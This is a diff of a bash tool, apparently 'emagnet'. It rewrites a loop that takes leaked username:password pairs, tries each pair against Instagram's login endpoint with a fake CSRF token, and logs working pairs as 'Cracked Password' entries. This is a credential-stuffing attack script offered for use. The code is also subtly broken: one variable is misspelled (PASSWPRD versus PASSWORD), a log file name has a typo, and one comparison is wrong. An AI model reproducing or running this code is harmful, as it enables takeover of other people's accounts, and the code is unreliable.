@@ -620,12 +620,16 @@ xCFSRTOKEN="$(< /dev/urandom tr -dc A-Za-z0-9 | head -c${1:-32};echo)"
     |cut -d'|' -f1 \
     |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> $HOME/.config/emagnet/tmp/.emagnet-instagram-accounts.txt
 
-while read instagramlogin; do
-INSTAGRAM_USER="$(echo $instagramlogin|cut -d':' -f1,2|sed 's/:/\&password\=/g')"
-INSTAGRAM_PASS="$(echo $instagramlogin|cut -d':' -f2)"
-curl "$URL" -H "$USERAGENT" -H 'x-requested-with: XMLHttpRequest' -H "x-csrftoken: $xCFSRTOKEN" -H "referer: $URL" --data 'username=INSTAGRAM_USER' 
-if [[ $? -eq "0" ]]; then
-         echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${INSTAGRAM_USER}:${INSTAGRAM_PASS}"
+
+
+URL="https://www.instagram.com/accounts/login/ajax/?hl=en"
+while read line; do
+USERNAME="$(echo $line|cut -d: -f1)"
+PASSWPRD="$(echo $line|cut -d: -f2)"
+TOKEN="$(< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c33)"
+curl -s $URL --data "username=$USERNAME&password=$PASSWORD" -H "x-csrftoken: $TOKEN"|awk '{print $4}'|grep -q true
+if [[ "$?" -ne "1" ]]; then
+         echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${USERNAME}:${PASSWORD}"
          echo -e "================================================================"             >>    "$EMAGNETLOGS/cracked-instagram-passwords.txt"
          echo -e "[+] Login Details For INSTAGRAM - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"        >>    "$EMAGNETLOGS/cracked-instasgram-passwords.txt"
          echo -e "[+]------------------------------------------------------------"              >>    "$EMAGNETLOGS/cracked-instagram-passwords.txt"
@@ -1178,8 +1182,8 @@ case "${1}" in
 
         "-n"|"-notify"|"--notify")
    	        emagnet_conf
-                if [[ "$?" -gt "0" ]]; then echo -e "$basename$0: internal error -- notify-send is required to be installed";exit 1; fi # Is notify-send installed?
-                if [[ "$2" != "true" && "$2" != "false" || -z "$2" ]]; then echo -e "$basename$0: internal error -- you must use true or false";exit 1;fi # Is you using a value?
+                if [[ "$?" -gt "0" ]]; then echo -e "$basename$0: internal error -- notify-send is required to be installed";exit 1; fi
+                if [[ "$2" != "true" && "$2" != "false" || -z "$2" ]]; then echo -e "$basename$0: internal error -- you must use true or false";exit 1;fi
                 if ! [[ "$NOTIFY" -eq "truee" ]]; then
                    notify-send "Emagnet" '\n[00] - This is a test\n[00] - If you see this\n[00] - Press Any Key'
                     echo -e "\rIf you see the notification, hit any key.\c"
